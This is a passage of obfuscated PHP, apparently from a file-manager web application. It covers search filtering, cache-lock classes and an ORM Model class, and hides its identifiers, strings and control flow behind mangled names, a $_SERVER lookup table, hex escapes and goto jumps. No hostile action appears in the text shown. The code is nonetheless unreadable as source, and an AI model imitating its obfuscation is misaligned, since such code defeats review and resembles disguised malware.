array_merge($²Á‰øÊ•, $ıÇ‹åàâ[$Æı›¢[424]]); $ıÇ‹åàâ[$Æı›¢[421]][$Æı›¢[422]] += count($²Á‰øÊ•); } private function _listSearchFilter($ôª‰°öå, $Àã“ì•) { $¬ë·áš =& $_SERVER[ú‡®¯¨±]; $š÷ùü¸ü = $ôª‰°öå[$¬ë·áš[463]] == $¬ë·áš[90]; if (!strstr($ôª‰°öå[$¬ë·áš[563]], $¬ë·áš[50] . $Àã“ì•[$¬ë·áš[182]] . $¬ë·áš[50])) { return !1; } if (isset($Àã“ì•[$¬ë·áš[464]]) && $Àã“ì•[$¬ë·áš[464]] != $¬ë·áš[1961]) { if ($Àã“ì•[$¬ë·áš[464]] == $¬ë·áš[77] && !$š÷ùü¸ü) { return !1; } if ($Àã“ì•[$¬ë·áš[464]] != $¬ë·áš[77] && $š÷ùü¸ü) { return !1; } if (!strstr($ôª‰°öå[$¬ë·áš[177]], $¬ë·áš[50] . $Àã“ì•[$¬ë·áš[464]] . $¬ë·áš[50])) { return !1; } } if (isset($Àã“ì•[$¬ë·áš[2170]]) && $Àã“ì•[$¬ë·áš[2170]] < $ôª‰°öå[$¬ë·áš[78]]) { return !1; } if (isset($Àã“ì•[$¬ë·áš[2171]]) && $Àã“ì•[$¬ë·áš[2171]] > $ôª‰°öå[$¬ë·áš[78]]) { return !1; } if (isset($Àã“ì•[$¬ë·áš[640]]) && $Àã“ì•[$¬ë·áš[640]] != $ôª‰°öå[$¬ë·áš[507]]) { return !1; } return !0; } public function listSearchChildren($åÛ‘Øç, $ëíÅÒ© = 5000) { $¸¾½“”œ =& $_SERVER[ú‡®¯¨±]; $ö¹ìÓğÄ = array(); $¨Ï˜éÜõ = $this->sourceInfo($åÛ‘Øç); $áóØ”İ = array($¸¾½“”œ[563] => array($¸¾½“”œ[437], $¨Ï˜éÜõ[$¸¾½“”œ[563]] . $¨Ï˜éÜõ[$¸¾½“”œ[183]] . $¸¾½“”œ[591])); $é°ÁšÒ‰ = $this->field($¸¾½“”œ[78])->where($áóØ”İ)->limit($ëíÅÒ© + 1)->select(); $¾âø²Í¶ = is_array($é°ÁšÒ‰) ? count($é°ÁšÒ‰) : 0; if ($¾âø²Í¶ > $ëíÅÒ©) { return $this->_listSearchChildrenNear($åÛ‘Øç, $ëíÅÒ©); } $È¥¤ÅÛè = $this->field($¸¾½“”œ[183])->where($áóØ”İ)->select(); $ö¹ìÓğÄ = array_to_keyvalue($È¥¤ÅÛè, $¸¾½“”œ[12], $¸¾½“”œ[183]); return $ö¹ìÓğÄ; } private function _listSearchChildrenNear($×Ìí«ØÆ, $çõñ³à) { $­Ï´ºÅˆ =& $_SERVER[ú‡®¯¨±]; $“ ÕÑÄ® = array(); $•ıñ´±÷ = array($­Ï´ºÅˆ[182] => $×Ìí«ØÆ); $ÚÔËİ¡” = $this->field($­Ï´ºÅˆ[2172])->where($•ıñ´±÷)->select(); $“í‰Ô¤ğ = array_to_keyvalue(array_filter_by_field($ÚÔËİ¡”, $­Ï´ºÅˆ[463], $­Ï´ºÅˆ[90]), $­Ï´ºÅˆ[12], $­Ï´ºÅˆ[183]); $“ ÕÑÄ® = array_merge($“ ÕÑÄ®, array_to_keyvalue($ÚÔËİ¡”, $­Ï´ºÅˆ[12], $­Ï´ºÅˆ[183])); if (!$“í‰Ô¤ğ) { return $“ ÕÑÄ®; } $•ıñ´±÷ = array($­Ï´ºÅˆ[182] => array($­Ï´ºÅˆ[7], $“í‰Ô¤ğ)); $ÚÔËİ¡” = $this->field($­Ï´ºÅˆ[2172])->where($•ıñ´±÷)->limit($çõñ³à)->select(); $“ ÕÑÄ® = array_merge($“ ÕÑÄ®, array_to_keyvalue($ÚÔËİ¡”, $­Ï´ºÅˆ[12], $­Ï´ºÅˆ[183])); $“ ÕÑÄ® = array_slice($“ ÕÑÄ®, 0, intval($çõñ³à)); return $“ ÕÑÄ®; } private function _listSearchBindPinyin($ÌÑÇ„ó, &$¥‘À¬©, &$Í‚å¸) { $àøêôç­ =& $_SERVER[ú‡®¯¨±]; if (!isset($ÌÑÇ„ó[$àøêôç­[2000]]) || !$ÌÑÇ„ó[$àøêôç­[2000]]) { return; } if (!Input::check($ÌÑÇ„ó[$àøêôç­[2000]], $àøêôç­[373]) || strlen($ÌÑÇ„ó[$àøêôç­[2000]]) < 2) { return; } $ñŒ”¶Ê = "\x4c\x45\x46\124\x20\x4a\x4f\111\116\40{$this->tablePrefix}\x69\x6f\137\x73\x6f\x75\162\x63\145\x5f\x6d\x65\x74\x61\x20\155\145\164\x61\x20\157\x6e\x20\163\x6f\165\162\x63\145\56\x73\157\165\x72\143\145\111\104\x20\75\40\x6d\145\x74\x61\56\163\157\165\x72\x63\x65\111\104"; $ïüˆ—Ú = array(); $Í‚å¸ = str_replace(array($àøêôç­[207], $àøêôç­[53], $àøêôç­[2173]), $àøêôç­[12], $Í‚å¸); $Í‚å¸ = $àøêôç­[489] . str_replace($àøêôç­[50], $àøêôç­[490], $Í‚å¸); $Ù…¢İÑ = $¥‘À¬©[$àøêôç­[32]]; unset($¥‘À¬©[$àøêôç­[32]]); foreach ($¥‘À¬© as $ñ™Å¦©½ => $”‡ãí¨Œ) { $ïüˆ—Ú[$àøêôç­[489] . $ñ™Å¦©½] = $”‡ãí¨Œ; } foreach ($Ù…¢İÑ as $©é»Í•) { $ïüˆ—Ú[] = array($àøêôç­[494] => $©é»Í•, $àøêôç­[1056] => $àøêôç­[2004], array($àøêôç­[2174] => $©é»Í•, $àøêôç­[2175] => array($àøêôç­[7], array($àøêôç­[516], $àøêôç­[515])))); } $this->join($ñŒ”¶Ê); $¥‘À¬© = $ïüˆ—Ú; } private function _parseSearchWhere($³’Š¾È) { $÷áôŸ« =& $_SERVER[ú‡®¯¨±]; $µáä¹×· = array(); if (isset($³’Š¾È[$÷áôŸ«[815]]) && $³’Š¾È[$÷áôŸ«[815]]) { $µáä¹×·[$÷áôŸ«[87]] = array($÷áôŸ«[2176], $³’Š¾È[$÷áôŸ«[815]]); } if (isset($³’Š¾È[$÷áôŸ«[816]]) && $³’Š¾È[$÷áôŸ«[816]]) { $î©ÓûÑ¤ = array($÷áôŸ«[2177], $³’Š¾È[$÷áôŸ«[816]]); if ($µáä¹×·[$÷áôŸ«[87]]) { $µáä¹×·[$÷áôŸ«[87]] = array($µáä¹×·[$÷áôŸ«[87]], $î©ÓûÑ¤, $÷áôŸ«[2178]); } else { $µáä¹×·[$÷áôŸ«[87]] = $î©ÓûÑ¤; } } if (isset($³’Š¾È[$÷áôŸ«[2170]]) && $³’Š¾È[$÷áôŸ«[2170]] > 0) { $µáä¹×·[$÷áôŸ«[78]] = array($÷áôŸ«[2176], $³’Š¾È[$÷áôŸ«[2170]]); } if (isset($³’Š¾È[$÷áôŸ«[2171]]) && $³’Š¾È[$÷áôŸ«[2171]]) { $î©ÓûÑ¤ = array($÷áôŸ«[2177], $³’Š¾È[$÷áôŸ«[2171]]); if ($µáä¹×·[$÷áôŸ«[78]]) { $µáä¹×·[$÷áôŸ«[78]] = array($µáä¹×·[$÷áôŸ«[78]], $î©ÓûÑ¤, $÷áôŸ«[2178]); } else { $µáä¹×·[$÷áôŸ«[78]] = $î©ÓûÑ¤; } } if (isset($³’Š¾È[$÷áôŸ«[640]]) && $³’Š¾È[$÷áôŸ«[640]]) { $µáä¹×·[] = array($÷áôŸ«[507] => $³’Š¾È[$÷áôŸ«[640]], $÷áôŸ«[505] => $³’Š¾È[$÷áôŸ«[640]], $÷áôŸ«[1056] => $÷áôŸ«[2004]); } if (isset($³’Š¾È[$÷áôŸ«[464]]) && $³’Š¾È[$÷áôŸ«[464]]) { $—«ÍÎºä = $³’Š¾È[$÷áôŸ«[464]]; if ($—«ÍÎºä == $÷áôŸ«[77]) { $µáä¹×·[$÷áôŸ«[463]] = 1; } else { if ($—«ÍÎºä == $÷áôŸ«[2179]) { $µáä¹×·[$÷áôŸ«[463]] = 0; } else { if ($—«ÍÎºä) { $—«ÍÎºä = is_array($—«ÍÎºä) ? $—«ÍÎºä : explode($÷áôŸ«[50], $—«ÍÎºä); $µáä¹×·[$÷áôŸ«[464]] = array($÷áôŸ«[470], $—«ÍÎºä); $µáä¹×·[$÷áôŸ«[463]] = 0; } } } } $this->_parseSearchParent($³’Š¾È, $µáä¹×·); if (isset($³’Š¾È[$÷áôŸ«[2000]]) && trim($³’Š¾È[$÷áôŸ«[2000]])) { $¼Ú‚ÌøÈ = trim($³’Š¾È[$÷áôŸ«[2000]]); $¨¦ŞÔì– = explode($÷áôŸ«[53], $¼Ú‚ÌøÈ); if (strlen($¼Ú‚ÌøÈ) > 2 && (substr($¼Ú‚ÌøÈ, 0, 1) == $÷áôŸ«[120] && substr($¼Ú‚ÌøÈ, -1) == $÷áôŸ«[120]) || substr($¼Ú‚ÌøÈ, 0, 1) == $÷áôŸ«[58] && substr($¼Ú‚ÌøÈ, -1) == $÷áôŸ«[58]) { $¼Ú‚ÌøÈ = substr($¼Ú‚ÌøÈ, 1, -1); $¨¦ŞÔì– = array($¼Ú‚ÌøÈ); } $µáä¹×·[$÷áôŸ«[32]] = array(array($÷áôŸ«[590], $÷áôŸ«[2002] . $¼Ú‚ÌøÈ . $÷áôŸ«[2002])); if (count($¨¦ŞÔì–) > 1) { $µáä¹×·[$÷áôŸ«[32]] = array(); foreach ($¨¦ŞÔì– as $ü¾Ù‘‹) { if (!trim($ü¾Ù‘‹)) { continue; } $µáä¹×·[$÷áôŸ«[32]][] = array($÷áôŸ«[590], $÷áôŸ«[2002] . trim($ü¾Ù‘‹) . $÷áôŸ«[2002]); } } } return $µáä¹×·; } private function _parseSearchParent($‡ˆì¤ãÇ, &$“ÌºÀÙ¦) { $ÎòĞ»à =& $_SERVER[ú‡®¯¨±]; if (!isset($‡ˆì¤ãÇ[$ÎòĞ»à[182]]) || !$‡ˆì¤ãÇ[$ÎòĞ»à[182]]) { return; } $©áµÜÔ = $this->pathInfo($‡ˆì¤ãÇ[$ÎòĞ»à[182]]); $ŸØ¯Šƒ = $©áµÜÔ[$ÎòĞ»à[182]] . $ÎòĞ»à[12] === $ÎòĞ»à[224]; $Şº…º‡ô = $©áµÜÔ[$ÎòĞ»à[180]] == $ÎòĞ»à[557]; if ($©áµÜÔ[$ÎòĞ»à[574]] == $ÎòĞ»à[575]) { $£†Ã€ = $this->sourceInfo($‡ˆì¤ãÇ[$ÎòĞ»à[182]]); $©áµÜÔ[$ÎòĞ»à[563]] = $£†Ã€[$ÎòĞ»à[563]]; } $“ÌºÀÙ¦[$ÎòĞ»à[630]] = array($ÎòĞ»à[590], $©áµÜÔ[$ÎòĞ»à[563]] . $‡ˆì¤ãÇ[$ÎòĞ»à[182]] . $ÎòĞ»à[591]); $šõøÉšß = isset($‡ˆì¤ãÇ[$ÎòĞ»à[1865]]) && in_array($ÎòĞ»à[557], $‡ˆì¤ãÇ[$ÎòĞ»à[1865]]); if (!$šõøÉšß || !$Şº…º‡ô || !$ŸØ¯Šƒ || !$©áµÜÔ[$ÎòĞ»à[465]]) { return; } if (!AuthModel::authCheckRoot($©áµÜÔ[$ÎòĞ»à[465]][$ÎòĞ»à[466]])) { return; } $²‹ıÏƒû = $©áµÜÔ[$ÎòĞ»à[548]] . $ÎòĞ»à[12]; if ($²‹ıÏƒû == $ÎòĞ»à[90]) { unset($“ÌºÀÙ¦[$ÎòĞ»à[630]]); $“ÌºÀÙ¦[$ÎòĞ»à[180]] = self::TYPE_GROUP; return; } $æÉÄ“‚À = Model($ÎòĞ»à[564])->groupChildrenAll($²‹ıÏƒû); $ßß íÜ = count($æÉÄ“‚À); if ($ßß íÜ <= 1) { return; } $š£æáÕÙ = array($ÎòĞ»à[182] => 0, $ÎòĞ»à[180] => self::TYPE_GROUP, $ÎòĞ»à[548] => array($ÎòĞ»à[7], $æÉÄ“‚À)); $Œ«¹ı¤ = $this->field($ÎòĞ»à[2180])->where($š£æáÕÙ)->limit($ßß íÜ)->select(); $“ÌºÀÙ¦[$ÎòĞ»à[630]] = array(); foreach ($Œ«¹ı¤ as $îÁòšÆ™) { $“ÌºÀÙ¦[$ÎòĞ»à[630]][] = array($ÎòĞ»à[590], $ÎòĞ»à[573] . $îÁòšÆ™[$ÎòĞ»à[183]] . $ÎòĞ»à[591]); } $“ÌºÀÙ¦[$ÎòĞ»à[630]][] = $ÎòĞ»à[2004]; } } goto FÈ¶îœŠÉî; CìóëŠ§‰: class CacheLockRedis { public function lock($í¡ÁÊé•, $‹æ´Œ¸‚ = 10) { $ÂİÙ¢Ø = Cache::init(); $¢½‰Úã = microtime(!0) + $‹æ´Œ¸‚; while (microtime(!0) < $¢½‰Úã) { $êùİÚ“ = $ÂİÙ¢Ø->get($í¡ÁÊé•); if (!$êùİÚ“) { $ÖÌ˜ìÀ = $ÂİÙ¢Ø->setLock($í¡ÁÊé•, $¢½‰Úã, $‹æ´Œ¸‚); if ($ÖÌ˜ìÀ) { return !0; } } else { if ($êùİÚ“ < microtime(!0)) { $ÂİÙ¢Ø->set($í¡ÁÊé•, $¢½‰Úã, $‹æ´Œ¸‚ * 2); if ($ÂİÙ¢Ø->get($í¡ÁÊé•) === $êùİÚ“) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¿ı£ª£) { return Cache::init()->get($¿ı£ª£); } public function unlock($ƒ„Çé) { return Cache::init()->remove($ƒ„Çé); } } class CacheLockMemcached { public function lock($õ­Ğ®üœ, $¢ŒÖŞú = 0) { $ëìÉç‚ = Cache::init(); $Ÿ‡ú£”ü = microtime(!0) + $¢ŒÖŞú; while (microtime(!0) < $Ÿ‡ú£”ü) { $š€ıŞ = $ëìÉç‚->get($õ­Ğ®üœ); if (!$š€ıŞ || $š€ıŞ < microtime(!0)) { $£ŞØÌ’ = $ëìÉç‚->handle->add($õ­Ğ®üœ, $Ÿ‡ú£”ü, $¢ŒÖŞú); if ($£ŞØÌ’) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ê¶©ìÏ÷) { return Cache::init()->get($ê¶©ìÏ÷); } public function unlock($ê„Ç·ÁÀ) { return Cache::init()->remove($ê„Ç·ÁÀ); } } class CacheLockDatabase { public function lock($ºÛ¥ƒÉ, $¡ÏÀ‡ßİ = 0) { $ñËæÓ’˜ = Model($_SERVER[ú‡®¯¨±][884]); $„®ş®® = microtime(!0) + $¡ÏÀ‡ßİ; while (microtime(!0) < $„®ş®®) { $»”½©‰ = $ñËæÓ’˜->get($ºÛ¥ƒÉ); if (!$»”½©‰ || $»”½©‰ < microtime(!0)) { $¼±½ËÙ = $ñËæÓ’˜->set($ºÛ¥ƒÉ, $„®ş®®); if ($¼±½ËÙ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ıËî‰Òã) { return Model($_SERVER[ú‡®¯¨±][884])->get($ıËî‰Òã); } public function unlock($ÜÚØùµ) { Model($_SERVER[ú‡®¯¨±][884])->remove($ÜÚØùµ); } } goto Dé°á¡ÁöË; b¹² öÖ””: define($_SERVER[ú‡®¯¨±][298], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\145", "\x6f\x72\x64\x65\162", "\x61\x6c\151\x61\163", "\x68\141\166\151\x6e\147", "\x67\x72\157\x75\160", "\x6c\157\x63\x6b", "\144\x69\163\164\x69\x6e\x63\164", "\x61\165\x74\x6f", "\146\151\x6c\164\x65\162", "\x76\141\x6c\x69\144\x61\164\145", "\x72\x65\163\x75\154\x74", "\142\151\x6e\144", "\x74\x6f\x6b\x65\156"); public function __construct($´üèĞ‡³ = '', $ÀÃİñ÷Ó = '', $ÛÑº´Œ = '') { $òÁÑÉÎ¿ =& $_SERVER[ú‡®¯¨±]; $this->_initialize(); if (!empty($´üèĞ‡³)) { if (strpos($´üèĞ‡³, $òÁÑÉÎ¿[10])) { list($this->dbName, $this->name) = explode($òÁÑÉÎ¿[10], $´üèĞ‡³); } else { $this->name = $´üèĞ‡³; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ÀÃİñ÷Ó)) { $this->tablePrefix = $òÁÑÉÎ¿[12]; } elseif ($òÁÑÉÎ¿[12] != $ÀÃİñ÷Ó) { $this->tablePrefix = $ÀÃİñ÷Ó; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($òÁÑÉÎ¿[299]); } $this->db(0, empty($this->connection) ? $ÛÑº´Œ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¡ïÎ­ÎÃ =& $_SERVER[ú‡®¯¨±]; if (empty($this->fields)) { if (think_config($¡ïÎ­ÎÃ[300])) { $çêÂáÚ = $this->dbName ? $this->dbName : think_config($¡ïÎ­ÎÃ[301]); $¯êÓã‘ = think_var_cache($¡ïÎ­ÎÃ[302] . strtolower(get_path_this($çêÂáÚ) . $¡ïÎ­ÎÃ[10] . $this->name)); if ($¯êÓã‘) { $ŞÀ¯‘ä¿ = think_config($¡ïÎ­ÎÃ[303]); if (empty($ŞÀ¯‘ä¿) || $¯êÓã‘[$¡ïÎ­ÎÃ[304]] == $ŞÀ¯‘ä¿) { $this->fields = $¯êÓã‘; return; } } } $this->flush(); } } public function flush() { $÷œ¥‚¢  =& $_SERVER[ú‡®¯¨±]; $this->db->setModel($this->name); $ò¬Ëá½ = $this->db->getFields($this->getTableName()); if (!$ò¬Ëá½) { return !1; } $this->fields = array_keys($ò¬Ëá½); $this->fields[$÷œ¥‚¢ [305]] = !1; foreach ($ò¬Ëá½ as $ã¥ƒ§ßÛ => $åÇÏ“ê) { $ÎÈØò„Ú[$ã¥ƒ§ßÛ] = $åÇÏ“ê[$÷œ¥‚¢ [33]]; if ($åÇÏ“ê[$÷œ¥‚¢ [39]]) { $this->fields[$÷œ¥‚¢ [306]] = $ã¥ƒ§ßÛ; if ($åÇÏ“ê[$÷œ¥‚¢ [42]]) { $this->fields[$÷œ¥‚¢ [305]] = !0; } } } $this->fields[$÷œ¥‚¢ [307]] = $ÎÈØò„Ú; if (think_config($÷œ¥‚¢ [303])) { $this->fields[$÷œ¥‚¢ [304]] = think_config($÷œ¥‚¢ [303]); } if (think_config($÷œ¥‚¢ [300])) { $ûİ›£Ó = $this->dbName ? $this->dbName : think_config($÷œ¥‚¢ [301]); think_var_cache($÷œ¥‚¢ [302] . strtolower(get_path_this($ûİ›£Ó) . $÷œ¥‚¢ [10] . $this->name), $this->fields); } } public function switchModel($–ƒÙ×××, $•‚¾ˆÉ’ = array()) { $™†ŞÃ¸„ =& $_SERVER[ú‡®¯¨±]; $†ıî·Õ° = ucwords(strtolower($–ƒÙ×××)) . $™†ŞÃ¸„[308]; if (!class_exists($†ıî·Õ°)) { think_exception($†ıî·Õ° . think_lang($™†ŞÃ¸„[309])); } $this->_extModel = new $†ıî·Õ°($this->name); if (!empty($•‚¾ˆÉ’)) { foreach ($•‚¾ˆÉ’ as $ô“ä°î) { $this->_extModel->setProperty($ô“ä°î, $this->{$ô“ä°î}); } } return $this->_extModel; } public function __set($‡Ó³éÓş, $ØàÅìÖ) { $this->data[$‡Ó³éÓş] = $ØàÅìÖ; } public function __get($«¯Õ”Ö) { return isset($this->data[$«¯Õ”Ö]) ? $this->data[$«¯Õ”Ö] : null; } public function __isset($¶·âÇÄé) { return isset($this->data[$¶·âÇÄé]); } public function __unset($Âœ– ÎÔ) { unset($this->data[$Âœ– ÎÔ]); } public function __call($óûÆö‡Ø, $Êû­ó–Ï) { $ıÚóŞä =& $_SERVER[ú‡®¯¨±]; if (in_array(strtolower($óûÆö‡Ø), $this->methods, !0)) { $this->options[strtolower($óûÆö‡Ø)] = $Êû­ó–Ï[0]; return $this; } elseif (in_array(strtolower($óûÆö‡Ø), array($ıÚóŞä[310], $ıÚóŞä[311], $ıÚóŞä[312], $ıÚóŞä[313], $ıÚóŞä[314]), !0)) { $ƒ—½îÇ = isset($Êû­ó–Ï[0]) ? $Êû­ó–Ï[0] : $ıÚóŞä[215]; $ƒ—½îÇ = $this->db->parseKey($ƒ—½îÇ); return $this->getField(strtoupper($óûÆö‡Ø) . $ıÚóŞä[315] . $ƒ—½îÇ . $ıÚóŞä[316] . $óûÆö‡Ø, $ıÚóŞä[310]); } elseif (strtolower(substr($óûÆö‡Ø, 0, 5)) == $ıÚóŞä[317]) { $ƒ—½îÇ = think_parse_name(substr($óûÆö‡Ø, 5)); $Îô÷©éÒ[$ƒ—½îÇ] = $Êû­ó–Ï[0]; return $this->where($Îô÷©éÒ)->find(); } elseif (strtolower(substr($óûÆö‡Ø, 0, 10)) == $ıÚóŞä[318]) { $Ú¯èµ¯» = think_parse_name(substr($óûÆö‡Ø, 10)); $Îô÷©éÒ[$Ú¯èµ¯»] = $Êû­ó–Ï[0]; return $this->where($Îô÷©éÒ)->getField($Êû­ó–Ï[1]); } elseif (isset($this->_scope[$óûÆö‡Ø])) { return $this->scope($óûÆö‡Ø, $Êû­ó–Ï[0]); } elseif (method_exists($this, $óûÆö‡Ø)) { array_unshift($Êû­ó–Ï, $óûÆö‡Ø); return call_user_func_array(array($this, $ıÚóŞä[319]), $Êû­ó–Ï); } else { return call_user_func_array(array(parent, $óûÆö‡Ø), $Êû­ó–Ï); } } protected function call() { $…åêÛ³‹ =& $_SERVER[ú‡®¯¨±]; $Â£¢®ò¦ = func_get_args(); $İì®·ì = array_shift($Â£¢®ò¦); $¿¿„±ğ = $İì®·ì; if (is_array($İì®·ì)) { $¿¿„±ğ = $İì®·ì[1]; $İì®·ì = $İì®·ì[0]; } $û¾›©­ü = count($Â£¢®ò¦) - 1; if (isset($Â£¢®ò¦[$û¾›©­ü]) && $Â£¢®ò¦[$û¾›©­ü] === $İì®·ì) { think_exception(__CLASS__ . $…åêÛ³‹[4] . $İì®·ì . think_lang($…åêÛ³‹[320])); return; } $Â£¢®ò¦[] = $İì®·ì; if (method_exists($this, $…åêÛ³‹[321])) { $˜É¬™ = call_user_func_array(array($this, $…åêÛ³‹[322]), array($¿¿„±ğ, $Â£¢®ò¦)); if (!is_null($˜É¬™) && $˜É¬™ !== !1) { return $˜É¬™; } } $¡É„“Ê© = call_user_func_array(array($this, $İì®·ì), $Â£¢®ò¦); if (method_exists($this, $…åêÛ³‹[323])) { $˜É¬™ = call_user_func_array(array($this, $…åêÛ³‹[324]), array($¿¿„±ğ, $Â£¢®ò¦, $¡É„“Ê©)); if ($˜É¬™) { return $˜É¬™; } } return $¡É„“Ê©; } protected function _initialize() { } protected function _facade($ ±ìÅª) { $ÎØÍÅˆß =& $_SERVER[ú‡®¯¨±]; if (!empty($this->fields)) { foreach ($ ±ìÅª as $œâËÑ‡ù => $ìó¬°€¸) { if (is_array($this->fields) && !in_array($œâËÑ‡ù, $this->fields, !0)) { unset($ ±ìÅª[$œâËÑ‡ù]); } elseif (is_scalar($ìó¬°€¸)) { $this->_parseType($ ±ìÅª, $œâËÑ‡ù); } } } if (!empty($this->options[$ÎØÍÅˆß[325]])) { $ ±ìÅª = array_map($this->options[$ÎØÍÅˆß[325]], $ ±ìÅª); unset($this->options[$ÎØÍÅˆß[325]]); } $this->_beforeWrite($ ±ìÅª); return $ ±ìÅª; } protected function _beforeWrite(&$ÄÕüó„) { } public function add($ÚçÊ®É“ = '', $…‘ıâ“¾ = array(), $œ–ü¼¦ˆ = false) { if (empty($ÚçÊ®É“)) { if (!empty($this->data)) { $ÚçÊ®É“ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ú‡®¯¨±][326]); return !1; } } $…‘ıâ“¾ = $this->_parseOptions($…‘ıâ“¾); $ÚçÊ®É“ = $this->_facade($ÚçÊ®É“); if (!1 === $this->_beforeInsert($ÚçÊ®É“, $…‘ıâ“¾)) { return !1; } $ÑÒ ş‘å = $this->db->insert($ÚçÊ®É“, $…‘ıâ“¾, $œ–ü¼¦ˆ); if (!1 !== $ÑÒ ş‘å) { $àò™…‚¢ = $this->getLastInsID(); if ($àò™…‚¢) { $ÚçÊ®É“[$this->getPk()] = $àò™…‚¢; $this->_after_insert($ÚçÊ®É“, $…‘ıâ“¾); return $àò™…‚¢; } $this->_after_insert($ÚçÊ®É“, $…‘ıâ“¾); } return $ÑÒ ş‘å; } protected function _beforeInsert(&$ˆ±ÆÂ€ƒ, $õ¾•ğ•) { } protected function _after_insert($²ÄÕ±ôš, $“ãë¿Òë) { } public function addAll($Æ¨›ê½°, $‹–É‰ÊÊ = array(), $ƒÌ“ŞºÛ = false) { $ï°ïƒ…Ø =& $_SERVER[ú‡®¯¨±]; if (empty($Æ¨›ê½°)) { $this->error = think_lang($ï°ïƒ…Ø[326]); return !1; } $‹–É‰ÊÊ = $this->_parseOptions($‹–É‰ÊÊ); foreach ($Æ¨›ê½° as $ÚŠÇ±Î => $ÙÇ¶ö¹) { $Æ¨›ê½°[$ÚŠÇ±Î] = $this->_facade($ÙÇ¶ö¹); } if (method_exists($this->db, $ï°ïƒ…Ø[327])) { $Úö½ÇÈÚ = $this->db->insertAll($Æ¨›ê½°, $‹–É‰ÊÊ, $ƒÌ“ŞºÛ); } else { $this->startTrans(); foreach ($Æ¨›ê½° as $ÚŠÇ±Î => $ÙÇ¶ö¹) { $Úö½ÇÈÚ = $this->db->insert($ÙÇ¶ö¹, $‹–É‰ÊÊ, $ƒÌ“ŞºÛ); } $this->commit(); } if (!1 !== $Úö½ÇÈÚ) { $ÛŸŒ»ñ‡ = $this->getLastInsID(); if ($ÛŸŒ»ñ‡) { return $ÛŸŒ»ñ‡; } } return $Úö½ÇÈÚ; } public function selectAdd($è÷Ş³í = '', $šåÑÂÑ = '', $ô¹ñÔƒ¤ = array()) { $üÑ‡Ú¥¡ =& $_SERVER[ú‡®¯¨±]; $ô¹ñÔƒ¤ = $this->_parseOptions($ô¹ñÔƒ¤); if (!1 === ($Íù òä = $this->db->selectInsert($è÷Ş³í ? $è÷Ş³í : $ô¹ñÔƒ¤[$üÑ‡Ú¥¡[328]], $šåÑÂÑ ? $šåÑÂÑ : $this->getTableName(), $ô¹ñÔƒ¤))) { $this->error = think_lang($üÑ‡Ú¥¡[329]); return !1; } else { return $Íù òä; } } public function save($ä ›Õ­í = '', $’â“¡¨Ş = array()) { $©Ş…º…È =& $_SERVER[ú‡®¯¨±]; if (empty($ä ›Õ­í)) { if (!empty($this->data)) { $ä ›Õ­í = $this->data; $this->data = array(); } else { $this->error = think_lang($©Ş…º…È[326]); return !1; } } $ä ›Õ­í = $this->_facade($ä ›Õ­í); $’â“¡¨Ş = $this->_parseOptions($’â“¡¨Ş); $ê‡Ç = $this->getPk(); if (!isset($’â“¡¨Ş[$©Ş…º…È[330]])) { if (isset($ä ›Õ­í[$ê‡Ç])) { $’¾äèˆÕ[$ê‡Ç] = $ä ›Õ­í[$ê‡Ç]; $’â“¡¨Ş[$©Ş…º…È[330]] = $’¾äèˆÕ; unset($ä ›Õ­í[$ê‡Ç]); } else { $this->error = think_lang($©Ş…º…È[329]); return !1; } } if (is_array($’â“¡¨Ş[$©Ş…º…È[330]]) && isset($’â“¡¨Ş[$©Ş…º…È[330]][$ê‡Ç])) { $®è—èÈ¬ = $’â“¡¨Ş[$©Ş…º…È[330]][$ê‡Ç]; } if (!1 === $this->_beforeUpdate($ä ›Õ­í, $’â“¡¨Ş)) { return !1; } $ñ–­¥û = $this->db->update($ä ›Õ­í, $’â“¡¨Ş); if (!1 !== $ñ–­¥û) { if (isset($®è—èÈ¬)) { $ä ›Õ­í[$ê‡Ç] = $®è—èÈ¬; } $this->_afterUpdate($ä ›Õ­í, $’â“¡¨Ş); } return $ñ–­¥û; } protected function _beforeUpdate(&$«èñÖ˜, $¼¶¬Ì×µ) { } protected function _afterUpdate($˜úËĞîŠ, $“ŞÂë¦ú) { } public function delete($Ç€æŸ‡ = array()) { $š™äÆ¿ =& $_SERVER[ú‡®¯¨±]; if (empty($Ç€æŸ‡) && empty($this->options[$š™äÆ¿[330]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Â«ø†¾ = $this->getPk(); if (is_numeric($Ç€æŸ‡) || is_string($Ç€æŸ‡)) { if (strpos($Ç€æŸ‡, $š™äÆ¿[50])) { $æÑÂ‚’[$Â«ø†¾] = array($š™äÆ¿[331], $Ç€æŸ‡); } else { $æÑÂ‚’[$Â«ø†¾] = $Ç€æŸ‡; } $this->options[$š™äÆ¿[330]] = $æÑÂ‚’; } $Ç€æŸ‡ = $this->_parseOptions(); if (is_array($Ç€æŸ‡[$š™äÆ¿[330]]) && isset($Ç€æŸ‡[$š™äÆ¿[330]][$Â«ø†¾])) { $¼ÉŸö˜ = $Ç€æŸ‡[$š™äÆ¿[330]][$Â«ø†¾]; } $¥í”£Àä = $this->db->delete($Ç€æŸ‡); if (!1 !== $¥í”£Àä) { $ Ÿ¿‹üš = array(); if (isset($¼ÉŸö˜)) { $ Ÿ¿‹üš[$Â«ø†¾] = $¼ÉŸö˜; } $this->_after_delete($ Ÿ¿‹üš, $Ç€æŸ‡); } return $¥í”£Àä; } protected function _after_delete($Öİ§™‹, $Ù—ØâêÌ) { } public function select($óê–ªôÀ = array()) { $çÛŒî’Ü =& $_SERVER[ú‡®¯¨±]; if (is_string($óê–ªôÀ) || is_numeric($óê–ªôÀ)) { $†¦½’é‚ = $this->getPk(); if (strpos($óê–ªôÀ, $çÛŒî’Ü[50])) { $Ú§«Ê¶†[$†¦½’é‚] = 